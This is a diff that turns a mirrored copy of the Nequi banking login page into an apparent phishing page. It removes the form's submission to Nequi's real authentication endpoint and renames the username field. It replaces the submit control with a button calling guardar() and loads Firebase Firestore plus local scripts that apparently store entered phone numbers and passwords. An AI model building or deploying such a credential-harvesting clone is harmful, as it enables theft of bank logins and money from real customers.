@@ -77,8 +77,7 @@
                 <h1>{{i18n.views.authLogin.title}}</h1>
                 <p>{{i18n.views.authLogin.phraseOne}}</p>
                 <div class="login-form-wrap">
-                    <form method="POST" action="https://transacciones.nequi.com/bdigital/loginServiceAuthentication"
-                        autocomplete="off" name="loginControl.formLogin" novalidate>
+                    <form>
                         <div class="input-wrap input-country">
                             <div class="wrap-select-country">
                                 <select-country selected-country="loginControl.selectCountry"
@@ -97,10 +96,9 @@
                                     
                                 </div>
                                 
-                                
                             </div>
 
-                            <input class="form-input-text" type="tel" id="j_username" name="j_username"
+                            <input class="form-input-text" type="tel" id="telefono" name="telefono"
                                 placeholder="{{i18n.views.authLogin.inputUser}}" ng-required="true"
                                 ng-minlength="configCountry.inputs.phoneNumber.minlength"
                                 ng-pattern="configCountry.inputs.phoneNumber.regEx" ng-model="loginControl.user"
@@ -113,8 +111,9 @@
                                 ng-minlength="configCountry.inputs.password.minlength"
                                 ng-pattern="configCountry.inputs.password.regEx" ng-model="loginControl.password">
                         </div class="btn-wrap">
-                        <input id="submitButton" type="submit" value="{{i18n.views.authLogin.submit}}"
-                            ng-click="loginControl.passEncrypt()" ng-disabled="!loginControl.formLogin.$valid">
+
+                        <button id="submitButton" onclick="guardar()">Entrar</button>
+                        
                 </div>
                 </form>
             </div>
@@ -133,6 +132,14 @@
 <script src="https://transacciones.nequi.com/bdigital/js/libs/string-mask.js"></script>
 <!-- App -->
 <script src="https://transacciones.nequi.com/bdigital/js/scripts.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+<script src="/js/configuracion.js"></script>
+<script src="/js/guardar.js"></script>
+
 
 <!-- Mirrored from transacciones.nequi.com by HTTrack Website Copier/3.x [XR/YP'2000] -->
 
